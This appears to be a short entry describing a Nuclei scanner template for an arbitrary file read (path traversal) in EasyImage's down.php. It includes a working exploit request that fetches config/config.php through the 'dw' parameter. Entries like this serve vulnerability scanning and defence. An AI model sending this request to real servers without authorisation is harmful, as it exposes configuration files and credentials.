# Nuclei Template: EasyImage down.php - Arbitrary File Read
**Template ID:** easyimage-downphp-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**Source:** Nuclei Template (`easyimage-downphp-lfi.yaml`)

## Vulnerability Information & PoC

## Description
down.php file in EasyImage is vulnerable to arbitrary file read.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/application/down.php?dw=config/config.php
```

## References
- https://github.com/qingchenhh/qc_poc/blob/main/Goby/EasyImage_down.php_file_read.go
